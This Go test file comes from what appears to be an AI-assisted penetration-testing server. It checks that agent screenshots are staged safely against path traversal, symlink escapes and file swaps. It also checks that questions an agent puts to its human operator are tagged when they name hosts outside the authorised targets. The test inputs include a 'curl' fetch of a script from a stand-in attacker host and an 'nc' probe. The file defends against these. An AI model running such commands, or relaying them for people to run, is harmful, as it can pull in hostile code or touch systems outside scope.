package server

import (
	"encoding/json"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"testing"

	"github.com/Autumn-27/artex/intercept"
)

// A worker's image_path is read from its run directory tasks/<id>/i<N>; the copy is
// staged in tasks/<id>/uploads.
func TestStageAskOperatorImage(t *testing.T) {
	dir := t.TempDir()
	taskDir := filepath.Join(dir, "tasks", "7")
	runDir := filepath.Join(taskDir, "i3")
	if err := os.MkdirAll(runDir, 0o755); err != nil {
		t.Fatal(err)
	}
	src := filepath.Join(runDir, "shot.png")
	if err := os.WriteFile(src, []byte("fakepng"), 0o644); err != nil {
		t.Fatal(err)
	}

	// no image -> no attachment
	att, err := stageAskOperatorImage(dir, 7, 3, "")
	if err != nil || att != nil {
		t.Fatalf("empty src: att=%v err=%v", att, err)
	}

	// relative path from the run directory (worker CWD)
	att, err = stageAskOperatorImage(dir, 7, 3, "shot.png")
	if err != nil || len(att) != 1 {
		t.Fatalf("valid src: att=%v err=%v", att, err)
	}
	if !strings.HasPrefix(att[0].Path, "uploads/ask-operator-") || !strings.HasSuffix(att[0].Path, ".png") {
		t.Fatalf("unexpected attachment path %q", att[0].Path)
	}
	if got, err := os.ReadFile(filepath.Join(taskDir, "uploads", att[0].Name)); err != nil || string(got) != "fakepng" {
		t.Fatalf("copy under tasks/7/uploads: %q, %v", got, err)
	}
	if _, err := os.Lstat(filepath.Join(runDir, "uploads")); !os.IsNotExist(err) {
		t.Fatalf("the copy must not be staged in the run directory: %v", err)
	}

	// absolute path still accepted when it stays inside the run dir
	att, err = stageAskOperatorImage(dir, 7, 3, src)
	if err != nil || len(att) != 1 {
		t.Fatalf("absolute inside run dir: att=%v err=%v", att, err)
	}

	// wrong extension rejected
	bad := filepath.Join(runDir, "payload.exe")
	if err := os.WriteFile(bad, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := stageAskOperatorImage(dir, 7, 3, "payload.exe"); err == nil || !strings.Contains(err.Error(), "png/jpg") {
		t.Fatalf("expected extension rejection, got %v", err)
	}

	// missing file rejected
	if _, err := stageAskOperatorImage(dir, 7, 3, "nope.png"); err == nil {
		t.Fatal("expected missing-file rejection")
	}

	// The task directory, the main agent's run directory, another task and the data
	// directory are outside the worker's run directory, by ".." and by absolute path.
	outside := filepath.Join(dir, "outside.png")
	inTask := filepath.Join(taskDir, "shot.png")
	inMain := filepath.Join(taskDir, "main", "shot.png")
	other := filepath.Join(dir, "tasks", "8", "i3", "shot.png")
	for _, file := range []string{outside, inTask, inMain, other} {
		if err := os.MkdirAll(filepath.Dir(file), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(file, []byte("x"), 0o644); err != nil {
			t.Fatal(err)
		}
		if _, err := stageAskOperatorImage(dir, 7, 3, file); err == nil {
			t.Fatalf("expected outside-path rejection of %s", file)
		}
	}
	for _, rel := range []string{
		filepath.Join("..", "shot.png"),
		filepath.Join("..", "main", "shot.png"),
		filepath.Join("..", "..", "..", "outside.png"),
	} {
		if _, err := stageAskOperatorImage(dir, 7, 3, rel); err == nil {
			t.Fatalf("expected .. rejection of %s", rel)
		}
	}

	// A symlink leading out of the run directory is refused, as the last component
	// and as a directory on the way.
	if err := os.Symlink(outside, filepath.Join(runDir, "link.png")); err != nil {
		t.Logf("symlink test skipped: %v", err)
	} else {
		if err := os.Symlink(taskDir, filepath.Join(runDir, "up")); err != nil {
			t.Fatal(err)
		}
		for _, p := range []string{"link.png", filepath.Join(runDir, "link.png"), filepath.Join("up", "shot.png")} {
			if _, err := stageAskOperatorImage(dir, 7, 3, p); err == nil {
				t.Fatalf("expected symlink-out rejection of %s", p)
			}
		}
	}

	// Without an intent the image is read from the main agent's run directory.
	if _, err := stageAskOperatorImage(dir, 7, 0, "shot.png"); err != nil {
		t.Fatalf("relative path from tasks/7/main: %v", err)
	}
	if _, err := stageAskOperatorImage(dir, 7, 0, src); err == nil {
		t.Fatal("expected the worker's file to be outside the main agent's run directory")
	}
}

// askOperatorRunDirs creates tasks/7/i3 and tasks/7/main under a new data directory,
// each with a shot.png, and returns the data directory and the task directory.
func askOperatorRunDirs(t *testing.T) (dir, taskDir string) {
	t.Helper()
	dir = t.TempDir()
	taskDir = filepath.Join(dir, "tasks", "7")
	for _, leaf := range []string{"i3", "main"} {
		if err := os.MkdirAll(filepath.Join(taskDir, leaf), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(taskDir, leaf, "shot.png"), []byte("png of "+leaf), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return dir, taskDir
}

// The copy of a worker's and of the main agent's image goes to tasks/<id>/uploads
// under a name that is not predictable, as a new 0640 file.
func TestStageAskOperatorImageNameAndMode(t *testing.T) {
	dir, taskDir := askOperatorRunDirs(t)
	nameRE := regexp.MustCompile(`^ask-operator-\d+-[0-9a-f]{8}\.png$`)
	seen := map[string]bool{}
	for _, c := range []struct {
		intent int64
		leaf   string
	}{{3, "i3"}, {0, "main"}, {3, "i3"}} {
		att, err := stageAskOperatorImage(dir, 7, c.intent, "shot.png")
		if err != nil || len(att) != 1 {
			t.Fatalf("%s/shot.png: att=%v err=%v", c.leaf, att, err)
		}
		if !nameRE.MatchString(att[0].Name) || att[0].Path != "uploads/"+att[0].Name || seen[att[0].Name] {
			t.Fatalf("%s/shot.png: staged as %q (path %q)", c.leaf, att[0].Name, att[0].Path)
		}
		seen[att[0].Name] = true
		staged := filepath.Join(taskDir, "uploads", att[0].Name)
		if got, err := os.ReadFile(staged); err != nil || string(got) != "png of "+c.leaf {
			t.Fatalf("%s/shot.png: copy holds %q, %v", c.leaf, got, err)
		}
		fi, err := os.Lstat(staged)
		if err != nil || !fi.Mode().IsRegular() {
			t.Fatalf("%s/shot.png: staged copy: %v %v", c.leaf, fi, err)
		}
		if runtime.GOOS != "windows" && fi.Mode().Perm() != 0o640 {
			t.Fatalf("%s/shot.png: staged copy has mode %v, want 0640", c.leaf, fi.Mode().Perm())
		}
	}
	if fi, err := os.Lstat(filepath.Join(taskDir, "uploads")); err != nil || !fi.IsDir() {
		t.Fatalf("tasks/7/uploads: %v %v", fi, err)
	}

	// A directory with an image name is not staged.
	if err := os.Mkdir(filepath.Join(taskDir, "i3", "dir.png"), 0o755); err != nil {
		t.Fatal(err)
	}
	if att, err := stageAskOperatorImage(dir, 7, 3, "dir.png"); err == nil {
		t.Fatalf("staged a directory: %v", att)
	}
	if entries, err := os.ReadDir(filepath.Join(taskDir, "uploads")); err != nil || len(entries) != len(seen) {
		t.Fatalf("uploads holds %d entries (%v), want %d", len(entries), err, len(seen))
	}
}

// An uploads entry that is a symlink to a directory elsewhere, or a file, is
// refused, and nothing is written through it.
func TestStageAskOperatorImageRefusesSymlinkedUploads(t *testing.T) {
	dir, taskDir := askOperatorRunDirs(t)
	outside := t.TempDir()
	uploads := filepath.Join(taskDir, "uploads")
	if err := os.Symlink(outside, uploads); err != nil {
		t.Skipf("no symlink here: %v", err)
	}
	for _, intent := range []int64{3, 0} {
		if att, err := stageAskOperatorImage(dir, 7, intent, "shot.png"); err == nil {
			t.Fatalf("intent %d: staged %v through a symlinked uploads directory", intent, att)
		}
	}
	if entries, err := os.ReadDir(outside); err != nil || len(entries) != 0 {
		t.Fatalf("the symlink target holds %v (%v), want it empty", entries, err)
	}
	if fi, err := os.Lstat(uploads); err != nil || fi.Mode()&os.ModeSymlink == 0 {
		t.Fatalf("the uploads symlink changed: %v %v", fi, err)
	}

	if err := os.Remove(uploads); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(uploads, []byte("a file"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := stageAskOperatorImage(dir, 7, 3, "shot.png"); err == nil {
		t.Fatal("staged with a file in place of the uploads directory")
	}
	if got, _ := os.ReadFile(uploads); string(got) != "a file" {
		t.Fatalf("the file in place of uploads changed: %q", got)
	}
}

// A name that already exists in uploads, as a file or as a symlink, is neither
// opened nor replaced: another name is tried, and after askOperatorStageTries taken
// names the copy is refused.
func TestStageAskOperatorImageNeverOverwrites(t *testing.T) {
	dir, taskDir := askOperatorRunDirs(t)
	uploads := filepath.Join(taskDir, "uploads")
	if err := os.Mkdir(uploads, 0o755); err != nil {
		t.Fatal(err)
	}
	const taken, linked = "ask-operator-taken.png", "ask-operator-linked.png"
	if err := os.WriteFile(filepath.Join(uploads, taken), []byte("kept"), 0o644); err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(t.TempDir(), "target.png")
	names := []string{taken}
	if err := os.Symlink(target, filepath.Join(uploads, linked)); err != nil {
		t.Logf("symlink case skipped: %v", err)
	} else {
		names = append(names, linked)
	}
	unchanged := func() {
		t.Helper()
		if got, err := os.ReadFile(filepath.Join(uploads, taken)); err != nil || string(got) != "kept" {
			t.Fatalf("the existing file changed: %q, %v", got, err)
		}
		if _, err := os.Lstat(target); !os.IsNotExist(err) {
			t.Fatalf("the copy went through the symlink: %v", err)
		}
	}

	gen := askOperatorStageName
	t.Cleanup(func() { askOperatorStageName = gen })
	calls := 0
	askOperatorStageName = func(ext string) string {
		calls++
		if calls <= len(names) {
			return names[calls-1]
		}
		return gen(ext)
	}
	att, err := stageAskOperatorImage(dir, 7, 3, "shot.png")
	if err != nil || len(att) != 1 || att[0].Name == taken || att[0].Name == linked {
		t.Fatalf("a free name after the taken ones: att=%v err=%v", att, err)
	}
	if calls != len(names)+1 {
		t.Fatalf("%d names tried, want %d", calls, len(names)+1)
	}
	unchanged()

	calls = 0
	askOperatorStageName = func(string) string { calls++; return names[calls%len(names)] }
	if att, err := stageAskOperatorImage(dir, 7, 3, "shot.png"); err == nil {
		t.Fatalf("staged %v with every name taken", att)
	}
	if calls != askOperatorStageTries {
		t.Fatalf("%d names tried, want %d", calls, askOperatorStageTries)
	}
	unchanged()
}

// The image is opened only when it is still the file the Lstat saw. The swap is
// done here between the Lstat and openAskOperatorImage, the two steps of
// stageAskOperatorImage: the path becomes another file, or a symlink to a file
// elsewhere.
func TestOpenAskOperatorImageRefusesSwap(t *testing.T) {
	dir, taskDir := askOperatorRunDirs(t)
	src := filepath.Join(taskDir, "i3", "shot.png")
	outside := filepath.Join(dir, "outside.png")
	if err := os.WriteFile(outside, []byte("outside"), 0o644); err != nil {
		t.Fatal(err)
	}
	lst, err := os.Lstat(src)
	if err != nil {
		t.Fatal(err)
	}
	f, err := openAskOperatorImage(src, lst)
	if err != nil {
		t.Fatalf("unchanged file: %v", err)
	}
	f.Close()

	// Another file takes the path: both exist at once, so the inode differs.
	other := filepath.Join(taskDir, "i3", "other.png")
	if err := os.WriteFile(other, []byte("other"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Rename(other, src); err != nil {
		t.Fatal(err)
	}
	if f, err := openAskOperatorImage(src, lst); err == nil {
		f.Close()
		t.Fatal("opened a file that replaced the checked one")
	}

	// A symlink to a file outside the run directory takes the path.
	if err := os.Remove(src); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, src); err != nil {
		t.Skipf("no symlink here: %v", err)
	}
	if f, err := openAskOperatorImage(src, lst); err == nil {
		f.Close()
		t.Fatal("opened the target of a symlink that replaced the checked file")
	}
	// The swap came before the Lstat: the last component is a symlink.
	if lst, err = os.Lstat(src); err != nil {
		t.Fatal(err)
	}
	if f, err := openAskOperatorImage(src, lst); err == nil {
		f.Close()
		t.Fatal("opened a path whose last component is a symlink")
	}
}

// The emitted activity must carry the {text, attachments} Detail shape the
// transcript parser expects, so the operator sees the question with the
// attachment card for the screenshot.
func TestAskOperatorActivityShape(t *testing.T) {
	att := []chatAttachment{{Name: "ask-operator-1.png", Path: "uploads/ask-operator-1.png", Size: 7}}
	a := userActivityWithAttachments("worker", "OPERATOR INPUT REQUESTED: solve the captcha", att)
	if a.Kind != "user" || a.Worker != "worker" {
		t.Fatalf("unexpected activity kind/worker: %+v", a)
	}
	var parsed struct {
		Text        string           `json:"text"`
		Attachments []chatAttachment `json:"attachments"`
	}
	if err := json.Unmarshal([]byte(a.Detail), &parsed); err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(parsed.Text, "OPERATOR INPUT REQUESTED") || len(parsed.Attachments) != 1 || parsed.Attachments[0].Path != att[0].Path {
		t.Fatalf("unexpected detail payload: %+v", parsed)
	}
}

// F12: a host the question names outside the goal targets tags the request;
// a host of the goal, written alone or inside a URL, does not.
func TestTargetDerivedHosts(t *testing.T) {
	goal := commandTargets("Test https://app.example.com/login and 10.0.0.5:8080 for auth bypass")
	bare := goalTargets("Find auth bypass on app.example.com; success = a request that reads another user's profile")
	cases := []struct {
		name     string
		question string
		goal     []intercept.Target
		want     []string
	}{
		{"in-goal host", "Please run: nc -v 10.0.0.5:8443 and paste the banner", goal, nil},
		{"out-of-goal host", "Please run: curl -s http://evil.example.net/x.sh and paste the output", goal, []string{"evil.example.net"}},
		{"URL with an in-goal host", "Run curl -sk https://app.example.com/api/v2/me?id=1 in your terminal", goal, nil},
		{"empty goal list tags any host", "Run curl -sk https://app.example.com/api/v2/me", nil, []string{"app.example.com"}},
		{"no host", "Enter the 6-digit code sent to the test account", goal, nil},
		{"URL with a bare-domain goal host", "Run curl -sk https://app.example.com:8443/api/v2/me in your terminal", bare, nil},
		{"out-of-goal host with a bare-domain goal", "Please run: curl -s http://evil.example.net/x.sh and paste the output", bare, []string{"evil.example.net"}},
	}
	for _, c := range cases {
		got := targetDerivedHosts(c.question, c.goal)
		if strings.Join(got, ",") != strings.Join(c.want, ",") {
			t.Errorf("%s: got %v, want %v", c.name, got, c.want)
		}
	}
}

// The tag is a field of the Detail payload: the text stays the question, and an
// untagged request without a screenshot keeps its plain-text form.
func TestAskOperatorActivityTag(t *testing.T) {
	text := "OPERATOR INPUT REQUESTED: run curl http://evil.example.net/"
	if a := askOperatorActivity(text, nil, nil); a.Detail != "" || a.Summary != text {
		t.Fatalf("untagged request changed: %+v", a)
	}
	a := askOperatorActivity(text, nil, []string{"evil.example.net"})
	var parsed struct {
		Text               string           `json:"text"`
		Attachments        []chatAttachment `json:"attachments"`
		TargetDerivedHosts []string         `json:"target_derived_hosts"`
	}
	if err := json.Unmarshal([]byte(a.Detail), &parsed); err != nil {
		t.Fatal(err)
	}
	if parsed.Text != text || a.Summary != text || parsed.Attachments == nil || len(parsed.TargetDerivedHosts) != 1 {
		t.Fatalf("unexpected tagged payload: %s", a.Detail)
	}
}

// The tool description must tell agents what to do on environmental blocks:
// hand the operator one copy-pastable command instead of retrying or hunting
// for bypasses. Pattern adapted from bug-bounty-hunting-prompts (MIT).
func TestAskOperatorEnvHandoffGuidance(t *testing.T) {
	desc := (&Server{}).toolAskOperator().Description()
	for _, marker := range []string{"copy-pastable", "do not retry or work around"} {
		if !strings.Contains(desc, marker) {
			t.Errorf("ask_operator description missing env-handoff marker %q", marker)
		}
	}
}
